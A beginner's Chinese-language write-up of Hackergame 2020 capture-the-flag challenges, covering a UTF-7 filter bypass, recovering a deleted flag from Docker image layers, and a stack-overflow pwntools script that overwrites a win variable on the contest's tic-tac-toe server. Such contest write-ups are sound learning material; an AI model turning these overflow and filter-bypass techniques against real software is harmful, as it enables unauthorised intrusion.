# 菜狗的第一次wp

## 签到题

试着拖一下进度条（？）再仔细观察一下网址就会有神奇的发现。

<img src="C:\Users\ayyk\Pictures\hackergame2020wp\签到2.png" alt="签到2" style="zoom: 33%;" />

## 猫咪问答

<img src="C:\Users\ayyk\Pictures\hackergame2020wp\猫咪问答.png" alt="猫咪问答" style="zoom: 33%;" />

1.菜狗只会一个个硬搜然后凭借薄弱的生物基础看logo

2.找原文件看一下发现只出现了一个数字256

3.找活动日志

4.谷歌地图放大（有人多停了？）

<img src="C:\Users\ayyk\Pictures\hackergame2020wp\猫咪.png" style="zoom:50%;" />

5.有手就行

## 2048

菜狗只能玩到信息安全

一个个点进去发现js文件里好像有想要的东西，硬搜了一下发现字符串表示的是banana，傻愣愣地试了一遍?get=banana发现不可行又去搜了ur1才拿到，最后被告知可以在控制台上整。

```
 var url;
  if (won) {
    url = "/getflxg?my_favorite_fruit=" + ('b'+'a'+ +'a'+'a').toLowerCase();
  } else {
    url = "/getflxg?my_favorite_fruit=";
  }
```

```
url = "/getflxg?my_favorite_fruit=" + ('b'+'a'+ +'a'+'a').toLowerCase();
"/getflxg?my_favorite_fruit=banana"
```



## 一闪而过的flag

<img src="C:\Users\ayyk\Pictures\hackergame2020wp\一闪而过的flag.png" alt="一闪而过的flag" style="zoom:50%;" />



太菜了，只能靠手速和精准地辨认1和l来手动输入flag。

## 233同学的字符串工具（编码转换工具）

1.看一眼源码

```
def to_utf8(s):
    r = re.compile('[fF][lL][aA][gG]')
    s = s.encode() # make it bytes
    if r.match(s.decode()):
        print('how dare you')
    elif s.decode('utf-7') == 'flag':
        print('yes, I will give you the flag')
        print(open('/flag2').read())
    else:
        print('%s' % s.decode('utf-7'))
```

大概意思就是 输入flag的utf-7编码就能拿到flag

研究了一下编码转换格式后 果断选择再搜一搜有无转换工具的菜狗

<img src="C:\Users\ayyk\Pictures\hackergame2020wp\字符串2.png" style="zoom:50%;" />

运气比较好 还是能找到的

```
Which tool do you want?
1. Convert my string to UPPERCASE!!
2. Convert my UTF-7 string to UTF-8!!
22
Welcome to the UTF-7->UTF-8 tool, please input your string: 
+AGYAbABhAGc-
yes, I will give you the flag
flag{please_visit_www.utf8everywhere.org_5109fd41f7}
```

## 233同学的docker

[docker找回构建时被删除的文件参考]: https://www.cnblogs.com/zejin2008/p/13460498.html

1.docker images查找镜像名称

2.docker pull 拉取目标镜像

```
docker pull 8b8d3c8324c7/stringtool:latest
latest: Pulling from 8b8d3c8324c7/stringtool
Digest: sha256:aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152
Status: Image is up to date for 8b8d3c8324c7/stringtool:latest
docker.io/8b8d3c8324c7/stringtool:latest
```

3.docke history 获取历史信息 发现想要的flag在第28层

```
docker history 8b8d3c8324c7/stringtool:latest
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
be6d023618d1        3 weeks ago         /bin/sh -c #(nop)  ENTRYPOINT ["/bin/sh" "-c…   0B                  
<missing>           3 weeks ago         /bin/sh -c rm /code/flag.txt                    0B                  
<missing>           3 weeks ago         /bin/sh -c #(nop) COPY dir:c36852c2989cd5e8b…   1.19kB              
<missing>           6 weeks ago         /bin/sh -c #(nop) WORKDIR /code                 0B                  
<missing>           6 weeks ago         /bin/sh -c mkdir /code                          0B                  
<missing>           6 weeks ago         /bin/sh -c #(nop)  ENV PYTHONUNBUFFERED=1       0B                  
<missing>           6 weeks ago         /bin/sh -c pip3 install pipenv                  37.5MB              
<missing>           6 weeks ago         /bin/sh -c pip3 install bpython                 5.08MB              
<missing>           6 weeks ago         /bin/sh -c pip3 install ipython                 23.8MB              
<missing>           6 weeks ago         /bin/sh -c yum clean all                        27.9MB              
<missing>           6 weeks ago         /bin/sh -c rm -rf /tmp/Python-3.7.3*            0B                  
<missing>           6 weeks ago         /bin/sh -c sed -i 's/python/python2/' /usr/b…   802B                
<missing>           6 weeks ago         /bin/sh -c pip install --upgrade pip            9.55MB              
<missing>           6 weeks ago         /bin/sh -c ln -s /usr/local/bin/pip3 /usr/bi…   19B                 
<missing>           6 weeks ago         /bin/sh -c ln -s /usr/local/bin/python3 /usr…   22B                 
<missing>           6 weeks ago         /bin/sh -c rm -f /usr/bin/python                0B                  
<missing>           6 weeks ago         /bin/sh -c make && make install                 300MB               
<missing>           6 weeks ago         /bin/sh -c /tmp/Python-3.7.3/configure          860kB               
<missing>           6 weeks ago         /bin/sh -c tar -zxvf /tmp/Python-3.7.3.tgz -…   79.3MB              
<missing>           6 weeks ago         /bin/sh -c wget -O /tmp/Python-3.7.3.tgz htt…   23MB                
<missing>           6 weeks ago         /bin/sh -c yum -y install mariadb-devel         103MB               
<missing>           6 weeks ago         /bin/sh -c yum -y install vim                   115MB               
<missing>           6 weeks ago         /bin/sh -c yum -y install gcc                   94.8MB              
<missing>           6 weeks ago         /bin/sh -c yum-builddep python -y               316MB               
<missing>           6 weeks ago         /bin/sh -c yum -y install wget make yum-utils   92.4MB              
<missing>           6 weeks ago         /bin/sh -c #(nop)  MAINTAINER Software_Engin…   0B                  
<missing>           2 months ago        /bin/sh -c #(nop)  CMD ["/bin/bash"]            0B                  
<missing>           2 months ago        /bin/sh -c #(nop)  LABEL org.label-schema.sc…   0B                  
<missing>           2 months ago        /bin/sh -c #(nop) ADD file:61908381d3142ffba…   203MB        
```

4.docker inspect 找到第27层  UpperDir为最顶层 （此处即第28层）

                "LowerDir": "/var/lib/docker/overlay2/71eea7db5a2546cdd949de378d1bd26fa5e1b56c078c536d69e0b6f7a0e56446/diff:/var/lib/docker/overlay2/84cc0cfbe67f835075e858272163e76ba000167372dd791186c2ef740becf984/diff:/var/lib/docker/overlay2/97608972c5fa12509ff962fd5cbad5387f72e0f402947bf521235749a5b45195/diff:/var/lib/docker/overlay2/fd82e07ec80f3249037de133a814614ed2f02ef27ccbc88bccf06385301ecc94/diff:/var/lib/docker/overlay2/974103978b0c8f9eaaffc8a800ea2b322c335702b9a11a6c9f63a34fe37cbd03/diff:/var/lib/docker/overlay2/247e2427ec92a370b73dd8c9cab9553df76671c5d4686fbc9ac82f8a9b4b764e/diff:/var/lib/docker/overlay2/49fd4fc382030af788bd70119e5231c7ee7537a8db210f4df9a6b7e371eaf717/diff:/var/lib/docker/overlay2/4455680b6fd278672c99eab335f50eceb450aef2729b19d138082d062f8f8d41/diff:/var/lib/docker/overlay2/154c8995b89d95ee46e801f83c37d742ac8a348f2a132c028581341b1e18414e/diff:/var/lib/docker/overlay2/0d411a2f785da7e3122530ea0bf881fbd07e15fe4604d945be89cfc3df4e9f67/diff:/var/lib/docker/overlay2/96eb7923719f484bf459ab8f1d4d3626e3b1ac82dbc8ce8179ff2d1bb74aec02/diff:/var/lib/docker/overlay2/b24b0f788c79606cccbf46adeb9acc3ca90dc4d363f7182fc2f739426a472d40/diff:/var/lib/docker/overlay2/62248d5070e1b1e72687220f1a871525937bb6c88a30de095750f854b19f09e5/diff:/var/lib/docker/overlay2/7e3e533884f81ebd4543f88b62c102dfbc0c7d6fd73d1b768c72ca91552ebf08/diff:/var/lib/docker/overlay2/115b5a2485ce15fbb2b7970ac8c8de77aca2a8dd67f9f6d9e4b3672f3e33a1aa/diff:/var/lib/docker/overlay2/2fe6b1fe6d69df0f05e7a235c8eb63c2383e17f949407bd08d769a59f7f66fc2/diff:/var/lib/docker/overlay2/7f4098994b0378eee2245acf632ce510e357ea1bdf115050f5e796a90ac60009/diff:/var/lib/docker/overlay2/193bab04897c0559590b7f51983aa695af01bcdcb13abb74da7e0188eb4dfabe/diff:/var/lib/docker/overlay2/e0117fdfe8440a0cf409910b3bd328dbc43695936dbb193a0260f74a8764937e/diff:/var/lib/docker/overlay2/481b3f69a0e3a4d85a14d9e67f9e6d8ce61aa315f3c9e3911ffa9cadf4d9c8a5/diff:/var/lib/docker/overlay2/46efa3f4929399b2e16b164e2f08f145bba07cfaacba9e6544a9c92da1b4e53e/diff:/var/lib/docker/overlay2/e94fda3bbc9e74e0c6e74c08fe795956f4472fc5f4aebafa296884b602b7bc9d/diff",
                "MergedDir": "/var/lib/docker/overlay2/fcd031b18dc91791418096bb6e1ba0255064edd5f5036b27d097286480cf042b/merged",
                "UpperDir": "/var/lib/docker/overlay2/fcd031b18dc91791418096bb6e1ba0255064edd5f5036b27d097286480cf042b/diff",
                "WorkDir": "/var/lib/docker/overlay2/fcd031b18dc91791418096bb6e1ba0255064edd5f5036b27d097286480cf042b/work"
            },
5.tree 进入第五层目录

6.cat 即可得到flag

## 生活在博弈树上（始终热爱大地）

玩了一下发现根本不可能赢 所以是现学现卖的简单栈溢出

1.拖进~~女朋友~~IDA里F5一下   发现只要v15为真就能拿到flag

```
if ( v15 )
  {
    puts("What? You win! Here is your flag:", v3, v5);
    flag_decode();
    puts(&flag, v3, v8);
  }
  else
```

2.但v15初始化为0 怎么办呢？当然是想办法让它变为非0啊（又是一个现学现卖的脚本）

```
from pwn import *



#r = process('./tictactoe')

r =remote('202.38.93.111',10141)



payload = '1'*(0x90-0x01) + p64(1)



token='1336:MEUCIQD4vcMOgJI3B1kB8AKi4Lz5C+J8Ws5CbSdHTJJrpBSYpQIgX8lLlQ9QRUCuZgZYGKYC/7uqDymqPXT3MsygcU+YDFo='

r.recvuntil('Please input your token:')

r.sendline(token)

r.recvuntil ( 'Your turn. Input like (x,y), such as (0,1):')

r.sendline(payload)



r.interactive()
```

## 233同学的字符串工具（字符串大写工具）思路无flag

```
def to_upper(s):
    r = re.compile('[fF][lL][aA][gG]')
    if r.match(s):
        print('how dare you')
    elif s.upper() == 'FLAG':
        print('yes, I will give you the flag')
        print(open('/flag1').read())
    else:
        print('%s' % s.upper())
```

大概意思是输入某些经upper后能转换为flag的特殊字符串就能拿到flag  但没想到怎么构造（躺）

## 狗狗银行 思路

凭借四舍五入薅羊毛  卡里有167就可以算1利润 但开200张卡是我妹想到的 想到了也不会写脚本（菜得并不安详）

## 从零开始的记账工具人 思路

开始想用excel自带的转换 但发现只有数值转中文的 B乎上找到的函数并没有起作用（也可能是自己太菜了）

于是再次栽在了没学好python上？（~~pythongame~~）

看了官方题解才想起来自己在考安全的时候已经有在用查找和替换了（真就没想到a）

## 小结

“你为什么哭？”

“因为我太菜了。”

就硬搜硬做 甚至有时候都不知道该搜啥 就像OpenGL大概找到是着色器方面的问题了但愣是不知道下一步该咋办了 真找到能拿到flag的教程还是很开心 还是继续多学习多做题8 无了